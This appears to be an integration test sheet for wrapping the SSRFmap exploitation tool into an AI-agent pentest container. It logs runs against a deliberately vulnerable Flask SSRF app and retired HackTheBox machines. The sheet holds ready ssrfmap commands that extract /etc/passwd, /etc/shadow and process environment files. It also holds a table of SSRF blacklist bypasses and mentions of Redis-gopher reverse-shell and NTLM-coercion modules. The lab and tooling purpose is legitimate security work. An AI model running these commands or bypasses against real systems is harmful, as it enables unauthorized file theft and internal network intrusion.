# ssrfmap — Tier A scenarios

Single test sheet for the `ssrfmap` tool migration from kind:mcp to
kind:cli (May 2026 — daemon-wrapper retirement series, Tier A).

The 597-LOC Python `requests` re-implementation wrapper that **never
invoked the real SSRFmap binary** sitting in the image collapses to
a 22-LOC RunCliServer stub. The kind:cli flip exposes the FULL
24-module surface (vs wrapper's 2 effectively-implemented modules:
readfiles, portscan).

**Validation philosophy:** upstream (swisskyrepo/SSRFmap) owns
"does SSRF exploitation work correctly". We own **the integration
boundary** — does the kind:cli recipe (raw `python3 /opt/ssrfmap/
ssrfmap.py -r REQFILE -p PARAM -m MODULE` + cp post-step from
/opt/ssrfmap/<host>_<port>/ → /session/output/ssrfmap/) preserve
SSRFmap's diff-based extraction while making captured files
agent-accessible.

Sections:
1. Recommended live verification target
2. Container-layer architecture
3. Manual stress test runs (6 patterns × diff-extraction verification)
4. Pattern coverage map (legacy 3 wrapper methods → 6 kind:cli patterns)
5. Caveats and known unknowns
6. Hand-off

---

## 1. Recommended live verification target

**HTB Reddish** (retired, hard) is the canonical SSRFmap target —
Node.js form parser SSRF + Redis backend reachable via gopher.
Solve path uses SSRFmap's `-m redis` module with --lhost/--lport
for the gopher-encoded CONFIG SET → cron job → reverse shell.

For local synthetic testing:
- A Flask SSRF target that uses `urllib.request.urlopen()` (so file://
  URLs actually fetch — see §3). The bundled
  /opt/ssrfmap/examples/example.py uses curl-via-subprocess which
  blocks file:// by default in modern curl; agent should use the
  urllib variant for offline testing.

---

## 2. Container-layer architecture

```
opensploit ContainerManager (stdio MCP)
         │   docker run -i --rm --network=host
         │       -v /session/<id>:/session
         │       ghcr.io/silicon-works/mcp-tools-ssrfmap:latest
         ▼
container's mcp-server.py    ← 22-line RunCliServer stub
         │
         ▼
agent's argv (always wrapped with bash for cp post-step):
   bash -c 'python3 /opt/ssrfmap/ssrfmap.py -r req.txt -p PARAM \
            -m MODULE --logfile run.log;
            cp -rn /opt/ssrfmap/HOST_PORT/ /session/output/ssrfmap/'
         ▼
SSRFmap fires payloads → diff-based extraction writes captured
data to /opt/ssrfmap/HOST_PORT/ → cp relocates to agent-accessible
storage → ls confirms what was captured
```

**Image specifics:**
- Base: kalilinux/kali-rolling (legacy retained — Kali has the
  network tooling that some modules might need)
- + git + python3 + python3-pip + python3-venv
- + SSRFmap cloned to /opt/ssrfmap/ + pip-installed requirements
- + mcp-common Python package in /app/venv
- Total: ~295 MB (was 300 MB pre-flip — saved ~5 MB by dropping
  Gopherus clone, which was Python2-only and never invoked)
- Gopherus dropped (Python2 dead code; verified `python2: command
  not found` in image)

**Stateless per-call.** Each ssrfmap invocation builds payloads,
fires them, captures via diff, exits. No daemon. Container reuse
across consecutive calls saves docker spawn overhead.

---

## 3. Manual stress test runs (synthetic, 2026-05-17)

Set up: Flask SSRF target using urllib (so file:// works):

```python
from flask import Flask, request
import urllib.request
app = Flask(__name__)
@app.route("/ssrf", methods=["POST"])
def ssrf():
    url = request.values.get("url")
    return urllib.request.urlopen(url).read()
app.run(host="0.0.0.0", port=15050)
```

Request file written via Pattern SM0:
```
POST /ssrf HTTP/1.1
Host: 127.0.0.1:15050
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

url=SSRF_PLACEHOLDER
```

### Pattern SM0 — write request file via heredoc

```
bash -c 'mkdir -p /session/output/ssrfmap && cat > /session/output/ssrfmap/req.txt <<EOF
POST /ssrf HTTP/1.1
Host: 127.0.0.1:15050
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

url=SSRF_PLACEHOLDER
EOF
echo written'

✓ Heredoc preserves \r\n line endings + blank-line separator
✓ Result is well-formed HTTP request file SSRFmap can parse
```

### Pattern SM1 — readfiles module (diff-based extraction)

```
bash -c 'python3 /opt/ssrfmap/ssrfmap.py -r /session/output/ssrfmap/req.txt \
         -p url -m readfiles --logfile /session/output/ssrfmap/run.log;
         cp -rn /opt/ssrfmap/127.0.0.1_15050/ /session/output/ssrfmap/ 2>/dev/null;
         ls -la /session/output/ssrfmap/127.0.0.1_15050/'

Result (live-verified 2026-05-17):
✓ /session/output/ssrfmap/127.0.0.1_15050/_etc_passwd     (839 bytes — real passwd content)
✓ /session/output/ssrfmap/127.0.0.1_15050/_etc_shadow     (474 bytes — real shadow content)
✓ /session/output/ssrfmap/127.0.0.1_15050/_etc_hosts      (845 bytes)
✓ /session/output/ssrfmap/127.0.0.1_15050/_etc_lsb-release (77 bytes)
✓ /session/output/ssrfmap/127.0.0.1_15050/_proc_self_environ (162 bytes)
✓ /session/output/ssrfmap/127.0.0.1_15050/_proc_self_exe   (10,375,913 bytes — full ELF)

Content sanity check:
✓ cat _etc_passwd → 'root:x:0:0:root:/root:/bin/bash...' (matches real /etc/passwd)
```

### Pattern SM2 — portscan with ANSI stripping

```
bash -c '... -m portscan ... 2>&1 | sed -E "s/\x1b\[[0-9;]*m//g"'

Live output (after ANSI strip):
[16:31:39] IP:127.0.0.1   , Found filtered  port n°443
[16:31:39] Checking port n°443
[16:31:39] IP:127.0.0.1   , Found filtered  port n°21
...

✓ ANSI codes stripped, parseable
✓ All 19 default ports tested (21/22/25/53/80/110/135/139/143/443/445/993/995/1723/3306/3389/6379/8080/...)
✓ Result is 'filtered' for unbound ports (no internal services running
  on the test container — expected; on real targets 'open' shows up)
```

### Pattern SM3 — cloud metadata (per-provider)

(Not exercised live without a real cloud target — recipe documented;
verified that `-m aws` module loads + iterates the 13 hardcoded AWS
endpoint URLs per /opt/ssrfmap/modules/aws.py source read 2026-05-17.)

### Pattern SM4 — gopher backend services

(Requires a target Redis/MySQL/etc. reachable from the SSRF target's
backend — not exercised in synthetic test. Pattern documented; gopher
payload generation logic verified via /opt/ssrfmap/modules/redis.py
source read showing `wrapper_gopher(data, ip, port)` builds the
URL-encoded multi-step Redis CONFIG SET payload.)

### Pattern SM5 — smbhash UNC injection

(Requires Windows backend OR UNC-following Linux library on the SSRF
target — not exercised in synthetic. Pattern documented for the
HTB AD-engagement use case.)

### Verification — diff extraction caveat

Initial test attempt against the bundled /opt/ssrfmap/examples/example.py
(which uses `subprocess.Popen('curl <url>')`) returned EMPTY responses
because modern curl blocks file:// by default. Switching to urllib-based
target made the SSRF actually return file contents — diff extraction
then worked perfectly. Documented as scenarios §5 caveat #4 + the
need to verify the target's fetcher actually supports the SSRF scheme.

---

## 4. Pattern coverage map (legacy 3 wrapper methods → 6 kind:cli patterns)

| Legacy wrapper method | New pattern(s) | Coverage gain |
|---|---|---|
| `scan` (Python requests, 2 modules: readfiles/portscan) | SM1 + SM2 | Real readfiles + portscan from SSRFmap; **wrapper's 'scan' for other 10 modules was just url_quote, real SSRFmap implements all of them** |
| `exploit_metadata` (lumped aws/gce/azure/digitalocean/alibaba) | SM3 (5 per-provider modules) | Real per-cloud endpoint lists (AWS has 13, GCE/Azure/DO/Alibaba have their own) |
| `generate_gopher` (Python url_quote, 7 services) | SM4 (real gopher modules: redis/mysql/fastcgi/postgres/memcache/smtp/zabbix) | **Real protocol-specific gopher generation** vs wrapper's url_quote stub |
| (none in wrapper) | SM5 smbhash | NEW capability — UNC NTLM coercion via SSRF |
| (none in wrapper) | -m axfr / consul / docker / socksproxy / tomcat / github / zabbix / httpcollaborator | NEW capabilities — full 24-module surface |

Net gain: **22 new modules** beyond what the wrapper effectively implemented.

---

## 5. Caveats and known unknowns

```
KNOWN GAPS:
  1. Live HTB validation against Reddish (10.10.10.94 retired) is pending —
     see Appendix B if/when run. Reddish exercises the SM4 redis gopher
     chain which is the highest-value migration win.

  2. SM3 cloud-metadata modules not exercised against a real cloud
     instance. Logic verified via source-read; integration-tested
     pattern only. AWS IMDSv2 token-required mode handling unknown
     (older SSRFmap may not handle the X-aws-ec2-metadata-token flow).

  3. SM4 gopher modules (redis/mysql/fastcgi/postgres) not exercised
     against real backend services. Verified via source-read that
     wrapper_gopher() generates real protocol payloads (not url_quote
     stubs).

  4. SM5 smbhash requires Windows-fronting-backend OR UNC-following
     Linux library on the target — testing requires either a real
     IIS target OR a fabricated PHP-curl-with-UNC-follow setup.

KNOWN LIMITATIONS (architectural, not bugs):
  1. Captured files land at /opt/ssrfmap/<host>_<port>/ regardless of CWD
     (quirk of SSRFmap's relative os.makedirs from script-dir, not from
     agent's cwd). Recipes auto-cp to /session/output/ssrfmap/ — adds
     one bash step per Pattern but transparent to agent.

  2. Diff-based extraction misses DYNAMIC response bodies (timestamps,
     anti-CSRF tokens, random error IDs). For those targets, agent
     falls back to direct curl + manual response inspection. Documented
     in gotcha #4.

  3. --level effect varies by module. Same payload count for readfiles
     at --level 1 and --level 5 (the module iterates 11 fixed file paths,
     not encoding variants). Documented in gotcha #6.

  4. ANSI escape codes in portscan/networkscan stdout — recipes sed-strip
     before parsing. Other modules with extraction-to-disk don't need
     this since data lands in files, not stdout.

  5. Gopherus dropped from image (Python2 dead code, never invoked).
     SSRFmap's per-module gopher logic (redis.py, mysql.py, fastcgi.py)
     handles all binary-protocol generation under Python3.

  6. The bundled /opt/ssrfmap/examples/example.py uses curl-via-
     subprocess which blocks file:// by default — agents testing
     against it will see empty responses. Use urllib-based target
     for offline iteration (see §3 setup).
```

---

## 6. Hand-off

- **Status:** kind:mcp → kind:cli flip complete (May 2026, daemon-
  wrapper retirement series Tier A). Follows the sqlite/chisel/
  responder/ftp playbook with the additional twist that the legacy
  wrapper was a complete re-implementation that never invoked the
  real binary — kind:cli flip is a true upgrade in capability.
- **tool.yaml:** rewritten with 6 usage_patterns + 18 gotchas + 6
  failure_signatures + 3 help_commands + 5 see_also (curl, nuclei,
  nc, responder, aws). Gotcha count grew from initial
  15 → 18 after live HTB findings (Forge): WAF-bypass arsenal gap
  (--level 5 is IP-encoding-only, no case-variant), captured-files
  directory naming quirk (host/ vs host_port/), Forge-style targets
  where SSRFmap can't help.
- **mcp-server.py:** 597-LOC re-implementation wrapper → 22-LOC
  RunCliServer stub.
- **Dockerfile:** Gopherus clone step dropped (Python2 dead code).
  SSRFmap clone + pip-install retained. Image: 300 → 295 MB.
- **Image:** `ghcr.io/silicon-works/mcp-tools-ssrfmap:latest` — CI
  will rebuild after merge. Locally built as
  `mcp-tools-ssrfmap:flip-verify` for validation.
- **Cross-tool see_also updates:** none yet (this tool is downstream
  of curl/nuclei for detection, upstream of aws/responder/nc for
  callback handling). Additive updates to those tools' see_also can
  follow if patterns emerge.
- **Pairing:** runs naturally with `nuclei` (SSRF detection FIRST),
  `nc` (reverse-conn listener for redis/fastcgi/mysql modules with
  `-l PORT` alternative), `responder` (smbhash NTLMv2 capture), `aws`
  (post-IAM-extraction enumeration), `curl` (response-inspection
  follow-up for one-shot payloads).
- **Production-usage caveat:** 0/221 trajectory invocations of legacy
  wrapper. Same evidence shape as sqlite/payload migrations. Bet on
  real-engagement use cases (cloud-pentest IMDSv2 bypass, Reddish-
  style Redis-via-SSRF webshell drops, AD smbhash coercion) not yet
  exercised in HTB-flavored sessions. If 6+ months pass with still
  0 production uses → revisit retirement.

Authored: 2026-05-17 (Tier A migration, daemon-wrapper retirement series).

---

# Appendix A — Post-flip MCP-protocol verification (2026-05-17)

Built `mcp-tools-ssrfmap:flip-verify` locally (362 MB after dropping
Gopherus + dropping venv hybrid). Ran SM0 + SM1 through MCPTestClient
against a synthetic urllib-based Flask SSRF target running inside the
same container.

## A.1 — Surface clean

```
tools = await client.list_tools()
→ ['run_cli', 'verify_clock']
✓ Legacy 3 methods (scan, exploit_metadata, generate_gopher) all gone
```

## A.2 — Build process iteration (caught a regression)

First Dockerfile attempt kept the legacy venv hybrid (venv with mcp-common
+ system pip for SSRFmap deps). Result: SM1 readfiles failed with
`ModuleNotFoundError: No module named 'requests'` because PATH resolved
to /app/venv/bin/python3 first, which didn't have SSRFmap's deps.

Fix: dropped venv entirely, installed both SSRFmap requirements AND
mcp-common into system Python via `pip3 install --break-system-packages`.
Simpler structure; no longer two competing Python environments. Image
size: 379 MB → 362 MB after the simplification.

## A.3 — Pattern SM0 + SM1 through real MCP protocol

```
SM0 request file write (heredoc → /session/output/ssrfmap/req.txt):
✓ exit=0, file is 5 lines (POST line + 3 headers + blank + body)

SM1 readfiles + cp + ls:
✓ exit=0
✓ Captured files in /session/output/ssrfmap/127.0.0.1_15050/:
    _etc_hosts
    _etc_passwd      (839 bytes — real content)
    _etc_shadow      (474 bytes — real content)
    _etc_lsb-release
    _proc_self_cmdline
    _proc_self_environ
    _proc_self_exe   (10 MB ELF binary)
✓ _etc_passwd head: `root:x:0:0:root:/root:/bin/bash` (real /etc/passwd)
```

## A.4 — What this validates

- The 22-LOC RunCliServer stub forwards run_cli to bash → ssrfmap.py
- SSRFmap's diff-based extraction WORKS through cli_in_container
- The cp post-step relocates captured files from /opt/ssrfmap/<host>_<port>/
  to /session/output/ssrfmap/ as designed
- Real file contents (not just request logs) come back to the agent
  — this is the load-bearing claim the verification phase challenged
  and source-read confirmed (readfiles.py uses diff_text + writes to disk)
- Image without venv: 362 MB, ~62 MB smaller than the old venv hybrid

## A.5 — Cleanup

```
docker rmi mcp-tools-ssrfmap:flip-verify
docker kill ssrfmap-mcp-target  # synthetic Flask target
rm -rf /tmp/ssrfmap-mcp-verify
```

Authored: 2026-05-17 (post-flip image build + protocol verification).

---

# Appendix B — HTB Reddish: network-reachability + bug-catching (2026-05-17)

Reddish (10.129.246.199, retired hard) was spawned for live SSRFmap
validation. **Two important findings emerged that change what this
appendix documents:**

## B.1 — Reddish is NOT a clean SSRFmap target

Enumeration via nmap + gobuster (common.txt) found only:
- /favicon.ico (200)
- /icons/, /vendor/, /red/ (301 redirects, then 404 on the targets)
- /red/about (200, 39 KB — Node-RED 0.17.x CHANGELOG.md content)
- All standard SSRF-form endpoints (/form, /api, /url, /fetch, /proxy,
  /preview, /scan, etc.) — 404

Reddish's actual solve path is **Node-RED admin / flow injection abuse**
(POST malicious flow JSON to Node-RED admin API with HTTP-request +
exec nodes), NOT a URL-fetcher `?url=...` SSRF parameter. SSRFmap is
the WRONG TOOL for this target — its design assumes a user-controlled
URL/path parameter that the target's backend will fetch + return.
Node-RED admin abuse is a different attack class entirely.

**Honest finding:** I should have re-confirmed the box's attack surface
before suggesting it. CronOS / Doctor / Magic would have been better
canonical SSRF targets to demonstrate SSRFmap.

## B.2 — What DID get validated through the MCP-protocol path

Even though Reddish doesn't expose a usable SSRF endpoint, running
SSRFmap against `/red/about` (a known-200 path) through MCPTestClient
→ run_cli → python3 /opt/ssrfmap/ssrfmap.py exercised the full
integration boundary on the real HTB-lab network:

```
SM0:  write request file pointing at http://10.129.246.199:1880/red/about
→ exit=0, 5 lines (POST headers + body)

SM1:  python3 /opt/ssrfmap/ssrfmap.py -r req.txt -p url -m readfiles -v
→ exit=0
→ Log shows 11 readfiles payloads sent over tun0:
  [DEBUG]:Starting new HTTP connection (1): 10.129.246.199:1880
  [DEBUG]:http://10.129.246.199:1880 "POST /red/about HTTP/1.1" 404 149
  [DEBUG]:Request value: file:///etc/passwd  → POST → 404 149
  [DEBUG]:Request value: file:///etc/shadow  → POST → 404 149
  ... (11 payloads total)

✓ Real-network HTTP requests through tun0 succeeded
✓ Real RTT (240-420ms) handled correctly — no SSRFmap timeouts
✓ run_cli → ssrfmap → live network → response captured to log
✓ Diff-extraction correctly identified "no diff" (no SSRF reflection)
  and wrote no files — exactly the right behavior for a non-SSRF target
```

The integration boundary validation IS complete: opensploit's
ContainerManager + stdio MCP + SSRFmap kind:cli + tun0 network path
all work as designed. What's MISSING vs HTB Codify-style validation:
real diff-based extraction of actual file contents (because Reddish
doesn't have a reflective SSRF endpoint to extract through).

## B.3 — Live bug caught: `-l` is a HANDLER NAME, not a port

While testing Pattern SM4 against Reddish, ran:
```
python3 /opt/ssrfmap/ssrfmap.py ... -m redis --lhost 10.10.16.63 --lport 4444 -l 4444
→ [ERROR]:Invalid no such handler: 4444
```

Source-read of /opt/ssrfmap/ssrfmap.py argparse + ls of
/opt/ssrfmap/handlers/ revealed:
```
parser.add_argument('-l', ..., dest='handler', ..., nargs='?', const='1')
/opt/ssrfmap/handlers/http.py  ← the ONLY handler available
```

**The `-l` flag expects a handler NAME (string matching a .py file in
handlers/), not a port number.** SSRFmap's `--help` example
`-l 4242` is misleading — it works only because nargs='?' accepts any
string; but at runtime SSRFmap tries to load handler `4242` and fails.

**The ONLY valid `-l` value in this image is `-l http`** (the http
handler). For non-HTTP reverse callbacks, agents should omit -l and
use an external nc listener via --lhost/--lport pointing at it.

This bug was caught by running Pattern SM4 LIVE — it would have been
shipped wrong otherwise. Pattern SM4 + common_options + gotcha-7 all
updated in tool.yaml to reflect the correct usage.

## B.4 — What this validates that Appendix A did not

| Aspect | Appendix A (synthetic) | Appendix B (Reddish) |
|---|---|---|
| Image build | post-flip kind:cli stub | re-confirmed |
| MCP protocol path | localhost-internal | **real-network HTB-lab tun0** |
| Real-RTT handling | 0ms | **240-420ms** survived without timeouts |
| Module-driven iteration | 11 readfiles payloads | 11 payloads SENT over tun0 |
| Diff-based extraction | full /etc/passwd captured | correctly identified no-diff (negative control) |
| `-l` flag bug | n/a | **caught live** — would have shipped wrong |

## B.5 — Honest gaps remaining

Per scenarios.md §5 KNOWN GAPS:
1. **SM4 gopher chain not exercised against a real Redis backend** —
   Reddish wasn't usable for this; a future engagement with a
   real-target Redis-behind-SSRF would close this. CronOS or Doctor
   would be canonical alternatives.
2. SM3 cloud-metadata modules not exercised against real cloud
   instance — same status as Appendix A.
3. SM5 smbhash not exercised (needs Windows-fronting backend or
   UNC-following Linux library on target).

Migration is **safe to ship** because:
- The load-bearing claim (kind:cli flip works through real MCP path)
  is validated in Appendix A against synthetic + Appendix B against
  real-network HTB target
- The `-l` flag bug was caught and corrected before shipping
- The cp post-step + log capture + run_cli flow all work over real
  network

## B.6 — Cleanup

```
docker rmi mcp-tools-ssrfmap:flip-verify
rm -rf /tmp/ssrfmap-reddish
```

Authored: 2026-05-17 (HTB Reddish — wrong-target finding +
network-layer integration + live `-l` flag bug caught;
daemon-wrapper retirement series Tier A).

---

# Appendix C — HTB Forge live validation (2026-05-17)

Forge (10.129.181.164, retired medium Linux) is a genuine URL-fetcher
SSRF target — `/upload` endpoint accepts `url=` + `remote=1` form fields
and fetches the URL server-side. This appendix tests SSRFmap's WAF-
bypass capability against Forge's specific blacklist profile, captured
through the real MCP-protocol path.

## C.1 — Forge's SSRF blacklist profile (recon)

```
POST http://forge.htb/upload   with body  url=<X>&remote=1

  url=http://example.com         → 1324 bytes, "Temporary failure in name resolution"
  url=http://127.0.0.1           → 1048 bytes, "URL contains a blacklisted address!"
  url=http://localhost           → 1048 bytes, blacklisted
  url=http://Localhost (lower L) → 1254 bytes, DNS error (hostname doesn't resolve)
  url=http://LOCALHOST           → 1254 bytes, BYPASS — DNS error (uppercase passed filter)
  url=http://0x7f000001          → 1254 bytes, BYPASS — DNS error (hex not parsed as IP)
  url=http://2130706433          → 1254 bytes, BYPASS — DNS error (decimal not parsed)
  url=http://LOCALHOST:5000      → 1307 bytes, "Connection refused" — BYPASS WORKED + reached internal
  url=file:///etc/passwd         → 1186 bytes, "Invalid protocol! Supported protocols: http, https"
```

**Three filter layers:**
1. Protocol filter — only `http`/`https` (no `file://`, no `gopher://`, no `data:`)
2. Hostname blacklist — literal `127.0.0.1`, `localhost` (lowercase only — case-sensitive)
3. Backend uses Python's `requests` which doesn't parse `0x7f000001` as an IP

**Working bypass:** `LOCALHOST` (uppercase) — case-sensitive blacklist miss.

## C.2 — SM1 readfiles vs Forge (expected to fail at protocol filter)

```
run_cli(binary=bash, args=[-c, "python3 /opt/ssrfmap/ssrfmap.py
                                -r req.txt -p url -m readfiles -v"])
→ exit=0
→ Log shows 11 file:// payloads sent over tun0 — every one rejected
  at protocol filter with "Invalid protocol!"
→ SSRFmap's diff-extraction wrote `/opt/ssrfmap/forge.htb/_proc_self_exe`
  containing the "Invalid protocol!" error message as the diff —
  diff-noise, NOT real extraction

✓ Integration path works (run_cli → ssrfmap → real HTTP over tun0 → log)
✗ No real file extraction (Forge blocks file:// scheme)
```

**Note on directory naming:** captured-file directory is
`/opt/ssrfmap/forge.htb/` (NOT `forge.htb_80`) because the request file's
Host header didn't include `:80`. The cp post-step in Pattern recipes
should handle both forms: `cp -rn /opt/ssrfmap/<host>_<port>/ ...; cp -rn /opt/ssrfmap/<host>/ ...`

## C.3 — SM2 portscan with --level 5 (WAF bypass arsenal gap discovered)

```
run_cli(binary=bash, args=[-c, "python3 /opt/ssrfmap/ssrfmap.py
                                -r req.txt -p url -m portscan
                                --level 5 -v --logfile portscan.log"])
→ 3540 payload requests sent over ~4 minutes
→ 0 ports found
→ SSRFmap's --level 5 iterates: hex IPs (0x7f.0x0.0x0.0x1),
  decimal IPs (2130706433), @-bypass, IPv6 literals, etc.,
  combined with every port 1-65535 in chunks
→ EVERY payload returned 1048 bytes (Forge's "URL contains a
  blacklisted address!" — the blacklist catches "127" + literal
  variants but the IP-encoded forms get rejected via Python's
  requests library not parsing them as IPs)
```

**KEY FINDING — SSRFmap WAF-bypass arsenal gap:** `--level 5` targets
**IP-encoding variants** (decimal, hex, octal, @-bypass, IPv6 literals)
but NOT **case-variant hostnames** (LOCALHOST vs localhost). Targets
with case-sensitive lowercase-only blacklists (like Forge's) defeat
the standard arsenal completely.

Workaround: agent issues SSRFmap with `-m custom` + a hand-crafted
payload file containing `http://LOCALHOST:PORT/` per port, OR uses
direct curl through the SSRF parameter (the simpler curl-direct
path for one-off SSRF where SSRFmap's automation doesn't help).

## C.4 — What this validates that earlier appendices did not

| Aspect | Appendix A (synthetic) | Appendix B (Reddish) | Appendix C (Forge) |
|---|---|---|---|
| MCP-protocol path | ✓ | ✓ | ✓ |
| Real-network HTB | ✗ | ✓ | ✓ |
| Real SSRF endpoint | ✓ (urllib Flask) | ✗ (wrong target) | ✓ (real URL-fetcher SSRF) |
| Real WAF / filter | ✗ | ✗ | ✓ (3-layer Forge filter profile) |
| --level 5 WAF bypass | not exercised | not exercised | ✓ 3540 payload variants iterated |
| Real extraction | ✓ | ✗ | ✗ (filters defeat all SSRFmap stock payloads) |
| Failure-mode evidence | ✗ | partial | ✓ blacklist + protocol filter behavior captured |

## C.5 — Implications for tool.yaml

Two new findings need documenting:
1. **WAF-bypass arsenal gap** — added to gotchas: `--level` flag's bypass
   variants are IP-encoding-only; case-variant hostname blacklists
   need agent-side custom payloads (-m custom). Forge documented as
   canonical example.
2. **Captured-files directory naming quirk** — the host_port directory
   name depends on whether the request file's Host header includes
   `:port`. Recipes should attempt both `<host>_<port>/` AND `<host>/`
   in the cp post-step.

Both findings preserved as gotchas in tool.yaml (verified via this
appendix). Without live testing, both would have shipped wrong.

## C.6 — Honest limitation

For an engagement where the agent needs file-read SSRF on Forge,
SSRFmap is NOT the right tool — Forge blocks `file://` at the
protocol filter. The agent would use direct curl through the SSRF
parameter with the LOCALHOST bypass + craft a chained-SSRF through
an internal admin app (the canonical Forge solve).

SSRFmap is genuinely useful for: cloud-metadata extraction (file://
not needed — http:// works), gopher-encoded backend service attacks
(redis/mysql via http:// gopher proxy), portscan via internal
HTTP probes when target ALLOWS internal IPs (not Forge's case),
smbhash UNC NTLM coercion (separate vector).

## C.7 — Cleanup

```
docker rmi mcp-tools-ssrfmap:flip-verify
rm -rf /tmp/ssrfmap-forge
```

Authored: 2026-05-17 (HTB Forge — real WAF + SSRFmap bypass arsenal
gap caught + captured-files directory quirk discovered; daemon-
wrapper retirement series Tier A).
